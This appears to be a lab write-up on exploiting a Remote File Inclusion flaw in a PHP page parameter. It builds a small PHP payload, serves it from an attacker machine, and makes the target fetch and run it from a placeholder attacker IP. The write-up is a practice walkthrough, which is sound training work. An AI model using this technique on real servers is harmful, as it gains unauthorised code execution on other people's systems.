# Basic Remote File Inclusion

This is a basic-level lab for practicing **Remote File Inclusion (RFI)** exploitation.

Once we access the given URL, we are presented with a **404 page**.

<img width="1084" height="405" alt="Screenshot 2026-08-20 141814" src="https://github.com/user-attachments/assets/116ea5b0-5098-49c1-be9e-55183342f837" />

<img width="712" height="422" alt="Screenshot 2026-08-20 142122" src="https://github.com/user-attachments/assets/dc540505-21fb-4996-b995-be07491fdb5c" />

Looking carefully at the URL, we can identify a parameter that may be worth testing.

<img width="556" height="32" alt="Screenshot 2026-08-20 142228" src="https://github.com/user-attachments/assets/6f2967e2-6ca9-4ab2-b3e8-0bcc66d9ab31" />

The application is using the following parameter:

```text
/index.php?page=404.php
```

## Payload Preparation

In this lab, the objective is to identify the **hostname of the server**.

Since the application is using PHP, we can create a simple PHP payload that executes the `hostname` command.

> The following command is executed on Linux.

```bash
echo '<?php echo `hostname`; ?>' > hostname.php
```

This creates a file named:

```text
hostname.php
```

with the following PHP code:

```php
<?php echo `hostname`; ?>
```

## Hosting the Payload

Next, host the payload from the attacking machine using Python's built-in HTTP server:

```bash
python3 -m http.server 8080
```

The file should now be accessible from:

```text
http://<ATTACKER-IP>:8080/hostname.php
```

## RFI Exploitation

Modify the vulnerable `page` parameter so that it points to the remotely hosted PHP file.

```text
/index.php?page=404.php
```

Change it to:

```text
/index.php?page=http://<ATTACKER-IP>:8080/hostname.php
```

If the application is vulnerable to RFI, the server retrieves the remote PHP file and includes it in the application.

Because the payload executes:

```bash
hostname
```

the hostname of the target server should be displayed directly on the page.

The successful response confirms that the `page` parameter is vulnerable to **Remote File Inclusion**, allowing remotely hosted PHP code to be included and executed by the target application.
